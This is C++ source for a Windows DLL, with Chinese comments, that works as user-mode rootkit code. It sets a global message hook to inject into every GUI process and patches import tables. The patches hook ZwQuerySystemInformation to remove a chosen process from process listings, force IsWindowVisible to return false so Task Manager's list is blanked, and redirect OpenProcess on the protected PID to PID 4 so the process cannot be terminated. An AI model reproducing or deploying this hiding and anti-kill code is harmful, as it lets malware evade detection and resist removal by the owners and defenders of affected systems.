// hook.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "hook.h"
#include <WinUser.h>
#include <TlHelp32.h>
#include <ImageHlp.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#pragma comment(lib,"ImageHlp")
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
//定义共享数据段
#pragma data_seg("MyData")
DWORD ishideor(0);        //判断是否隐藏进程
DWORD protect_pid(0);
DWORD term_pid(0);
PROC user32(0);
PROC isview(0);
PROC antdll(0);
PROC* proc_user32(0);
PROC* proc_isview(0);
PROC* proc_query(0);
HWND Hwnd_prot(0);
HMODULE module(0);    //dll模块句柄
#pragma data_seg()
#pragma comment(linker,"/SECTION:MyData,RWS")
//共享数据段定义结束
HHOOK hook;
PROC lanjie, lanjie1, lanjie2, lanjie3;
PROC *ppfn = NULL;
DWORD realaddr = 0;
CString curpid, readpid;
typedef HANDLE(WINAPI *ter)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI *isv)(_In_ HWND hWnd);
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,              // 0        Y        N
	SystemProcessorInformation,          // 1        Y        N
	SystemPerformanceInformation,        // 2        Y        N
	SystemTimeOfDayInformation,          // 3        Y        N
	SystemNotImplemented1,               // 4        Y        N
	SystemProcessesAndThreadsInformation, // 5       Y        N
	SystemCallCounts,                    // 6        Y        N
	SystemConfigurationInformation,      // 7        Y        N
	SystemProcessorTimes,                // 8        Y        N
	SystemGlobalFlag,                    // 9        Y        Y
	SystemNotImplemented2,               // 10       Y        N
	SystemModuleInformation,             // 11       Y        N
	SystemLockInformation,               // 12       Y        N
	SystemNotImplemented3,               // 13       Y        N
	SystemNotImplemented4,               // 14       Y        N
	SystemNotImplemented5,               // 15       Y        N
	SystemHandleInformation,             // 16       Y        N
	SystemObjectInformation,             // 17       Y        N
	SystemPagefileInformation,           // 18       Y        N
	SystemInstructionEmulationCounts,    // 19       Y        N
	SystemInvalidInfoClass1,             // 20
	SystemCacheInformation,              // 21       Y        Y
	SystemPoolTagInformation,            // 22       Y        N
	SystemProcessorStatistics,           // 23       Y        N
	SystemDpcInformation,                // 24       Y        Y
	SystemNotImplemented6,               // 25       Y        N
	SystemLoadImage,                     // 26       N        Y
	SystemUnloadImage,                   // 27       N        Y
	SystemTimeAdjustment,                // 28       Y        Y
	SystemNotImplemented7,               // 29       Y        N
	SystemNotImplemented8,               // 30       Y        N
	SystemNotImplemented9,               // 31       Y        N
	SystemCrashDumpInformation,          // 32       Y        N
	SystemExceptionInformation,          // 33       Y        N
	SystemCrashDumpStateInformation,     // 34       Y        Y/N
	SystemKernelDebuggerInformation,     // 35       Y        N
	SystemContextSwitchInformation,      // 36       Y        N
	SystemRegistryQuotaInformation,      // 37       Y        Y
	SystemLoadAndCallImage,              // 38       N        Y
	SystemPrioritySeparation,            // 39       N        Y
	SystemNotImplemented10,              // 40       Y        N
	SystemNotImplemented11,              // 41       Y        N
	SystemInvalidInfoClass2,             // 42
	SystemInvalidInfoClass3,             // 43
	SystemTimeZoneInformation,           // 44       Y        N
	SystemLookasideInformation,          // 45       Y        N
	SystemSetTimeSlipEvent,              // 46       N        Y
	SystemCreateSession,                 // 47       N        Y
	SystemDeleteSession,                 // 48       N        Y
	SystemInvalidInfoClass4,             // 49
	SystemRangeStartInformation,         // 50       Y        N
	SystemVerifierInformation,           // 51       Y        Y
	SystemAddVerifier,                   // 52       N        Y
	SystemSessionProcessesInformation    // 53       Y        N
} SYSTEM_INFORMATION_CLASS;
typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
}CLIENT_ID, *PCLIENT_ID;

typedef struct
{
	USHORT Length;
	USHORT MaxLen;
	USHORT *Buffer;
}UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_COUNTERSEX {
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
} IO_COUNTERSEX, *PIO_COUNTERSEX;

typedef enum {
	StateInitialized,
	StateReady,
	StateRunning,
	StateStandby,
	StateTerminated,
	StateWait,
	StateTransition,
	StateUnknown
} THREAD_STATE;

typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;
typedef VM_COUNTERS *PVM_COUNTERS;

typedef struct _SYSTEM_THREADS {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	ULONG Priority;
	ULONG BasePriority;
	ULONG ContextSwitchCount;
	THREAD_STATE State;
	ULONG WaitReason;
} SYSTEM_THREADS, *PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES { // Information Class 5
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	ULONG BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	IO_COUNTERSEX IoCounters;  // Windows 2000 only
	SYSTEM_THREADS Threads[1];
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;

typedef
NTSTATUS
(NTAPI *ZWQUERYSYSTEMINFORMATION)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);

ZWQUERYSYSTEMINFORMATION zwquerysysteminformation;    //实例化函数对象
//=================================进程隐藏实现
NTSTATUS WINAPI MyZwQuerySystemInformation(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
)
{
	zwquerysysteminformation = (ZWQUERYSYSTEMINFORMATION)antdll;    //返回原始函数地址到函数对象
	NTSTATUS ntStatus;
	PSYSTEM_PROCESSES pSystemProcesses = NULL, Prev;
	Sleep(1);
	ntStatus = (zwquerysysteminformation)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);  //调用原函数
	if (NT_SUCCESS(ntStatus) && SystemInformationClass == SystemProcessesAndThreadsInformation)
	{
		pSystemProcesses = (PSYSTEM_PROCESSES)SystemInformation;   //读取地址为结构体类型
		if (pSystemProcesses->ProcessId == protect_pid)
		{
			return ntStatus;
		}
		while (TRUE)
		{
			if (pSystemProcesses->ProcessId == protect_pid) //如果是我们需要隐藏的PID就进行数据修改
			{
				if (pSystemProcesses->NextEntryDelta)
				{
					//当我们需要隐藏的进程后面还有进程时
					//越过我们自己进程让NextEntryDelta直接指向下一个数据块
					DWORD dwOldProtect;
					//改成读写可执行状态
					if (!VirtualProtect((void *)Prev, sizeof(_SYSTEM_PROCESSES) * 3, PAGE_EXECUTE_READWRITE, &dwOldProtect))
					{
						MessageBox(NULL, _T("VirtualProtect error!"), NULL, MB_OK);
						return false;
					}
					Prev->NextEntryDelta += pSystemProcesses->NextEntryDelta;
					VirtualProtect((void *)Prev, sizeof(_SYSTEM_PROCESSES) * 3, dwOldProtect, 0);
				}
				else
				{
					//当我们进程处于最后一个数据那么我们就把上一个数据结构的NextEntryDelta置0
					//这时系统在遍历我们进程时就不会发现了
					Prev->NextEntryDelta = 0;
				}
				break;
			}
			if (!pSystemProcesses->NextEntryDelta) break;
			Prev = pSystemProcesses;
			pSystemProcesses = (PSYSTEM_PROCESSES)((char *)pSystemProcesses + pSystemProcesses->NextEntryDelta);
		}
	}
	return ntStatus;

}
//=============================================以上为隐藏进程代码
BOOL WINAPI MyIsWindowVisible(
	_In_ HWND hWnd
)
{
	return FALSE;    //拒绝任务管理器显示任务列表
	 
}
 
  HANDLE WINAPI myopenprocess(DWORD DWSIZE, BOOL jc, DWORD PID)
{
	  term_pid = PID;
     CString stop_lanjie(_T("")), stop_term(_T(""));
	 stop_lanjie.Format(_T("%x"), protect_pid);
	 stop_term.Format(_T("%x"), term_pid);
	 if (stop_lanjie == stop_term)
	 {
 	 return((ter)(FARPROC)user32)(DWSIZE, jc, 4); //向调用者返回系统内核的PID
	 }
	 else
	  return((ter)(FARPROC)user32)(DWSIZE, jc, PID); //放行	  
}
 

void inject(DWORD ds)
{
	DWORD protect = 0;
	HMODULE hmodule = ::LoadLibrary(_T("Kernel32.dll"));
	HMODULE hview = ::LoadLibrary(_T("user32.dll"));
	HMODULE hntdll = ::LoadLibrary(_T("ntdll.dll"));
	user32 = GetProcAddress(hmodule, "OpenProcess"); //获取系统函数地址
	isview = GetProcAddress(hview, "IsWindowVisible");
	antdll = ::GetProcAddress(hntdll, "ZwQuerySystemInformation");
 	lanjie = (PROC)myopenprocess;    //PID过滤函数地址
	lanjie2 = (PROC)MyIsWindowVisible;
	lanjie3 = (PROC)MyZwQuerySystemInformation;
	ULONG size;
	HMODULE he = GetModuleHandle(NULL);  //本模块

	PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(he, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size);//获取进程IAT表
	for (; import->Name; import++)   //循环遍历进程内加载的动态链接库名称(dll)
	{
		PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)he + import->FirstThunk);  //该结构体存储导入段符号相关信息
		for (; thunk->u1.Function; thunk++)   //遍历导入段符号
		{
			ppfn = (PROC*)&thunk->u1.Function;  //获取符号地址
			//拦截任务管理器任务栏列表，防止其发送销毁窗口信息
			if (*ppfn == isview)
			{
				  proc_isview = ppfn;    //保存原函数地址
				VirtualProtect(ppfn, sizeof(lanjie2), PAGE_WRITECOPY, &protect);               //去除写保护属性
				WriteProcessMemory(GetCurrentProcess(), ppfn, &lanjie2, sizeof(lanjie2), NULL);
				VirtualProtect(ppfn, sizeof(lanjie2), protect, &protect);
			}
			//==========================if else 选择进程保护方法，拦截还是隐藏,由ishideor的值决定
			if (*ppfn == user32 && !ishideor)
			{
				if (*ppfn == user32)
				{
					proc_user32= ppfn;                                                           //保存拦截函数地址
					VirtualProtect(ppfn, sizeof(lanjie), PAGE_WRITECOPY, &protect);               //去除写保护属性
					WriteProcessMemory(GetCurrentProcess(), ppfn, &lanjie, sizeof(lanjie), NULL); //覆写指向OpenProcess函数的地址
					VirtualProtect(ppfn, sizeof(lanjie), protect, &protect);                      //恢复写保护属性
				}
			} 
			else if (*ppfn == antdll && ishideor)               //隐藏，拦截ZwQuerySystemInformation函数
			{
				proc_query = ppfn;
				VirtualProtect(ppfn, sizeof(lanjie3), PAGE_WRITECOPY, &protect);               //去除写保护属性
				WriteProcessMemory(GetCurrentProcess(), ppfn, &lanjie3, sizeof(lanjie3), NULL);
				VirtualProtect(ppfn, sizeof(lanjie3), protect, &protect);                      //恢复写保护属性
			}
			 
		}//^for循环，遍历导入段符号地址
	}
}
LRESULT CALLBACK proc(int code, WPARAM wm, LPARAM lm)
{
	inject(protect_pid); //注入拦截函数
	return false;
}
void out(DWORD DD,DWORD p_pid,DWORD hideor)
{
	ishideor = hideor;                    //是否指定隐藏
	protect_pid = p_pid;
 	 module = GetModuleHandle(_T("hook.dll")); //获取dll模块句柄
	if (!module)
		MessageBox(NULL, _T("无法获取dll模块信息"), NULL, NULL);
	hook = SetWindowsHookEx(WH_GETMESSAGE, proc, module, 0);  //设置系统全局钩子，将proc函数设置成钩子消息处理函数
	if (!hook)
		MessageBox(NULL, _T("HOOK模块添加失败"), NULL, NULL);
}
void unhook()
{
	DWORD dwnew = 0;
	VirtualProtect(proc_isview, sizeof(isview), PAGE_WRITECOPY, &dwnew);
	WriteProcessMemory(GetCurrentProcess(), proc_isview, &isview, sizeof(isview), NULL);      //恢复IsWindowVisible函数地址
	VirtualProtect(proc_isview, sizeof(isview), dwnew, &dwnew);
	if (ishideor)
	{
		VirtualProtect(proc_query, sizeof(antdll), PAGE_WRITECOPY, &dwnew);
		WriteProcessMemory(GetCurrentProcess(), proc_query, &antdll, sizeof(antdll), NULL);   //恢复ZwQuerySystemInformation函数地址
		VirtualProtect(proc_query, sizeof(antdll), dwnew, &dwnew);
	}
	else
	{
		VirtualProtect(proc_user32, sizeof(user32), PAGE_WRITECOPY, &dwnew);
		WriteProcessMemory(GetCurrentProcess(), proc_user32, &user32, sizeof(user32), NULL);  //恢复OpenProcess函数地址
		VirtualProtect(proc_user32, sizeof(user32), dwnew, &dwnew); 
	}
	UnhookWindowsHookEx(hook); //卸载全局钩子
	FreeLibrary(module);   //卸载dll
}
CWinApp theApp;
int main()
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(nullptr);

	if (hModule != nullptr)
	{
		// 初始化 MFC 并在失败时显示错误
		if (!AfxWinInit(hModule, nullptr, ::GetCommandLine(), 0))
		{
			// TODO: 更改错误代码以符合您的需要
			wprintf(L"错误: MFC 初始化失败\n");
			nRetCode = 1;
		}
		else
		{
			// TODO: 在此处为应用程序的行为编写代码。
		}
	}
	else
	{
		// TODO: 更改错误代码以符合您的需要
		wprintf(L"错误: GetModuleHandle 失败\n");
		nRetCode = 1;
	}

	return nRetCode;
}

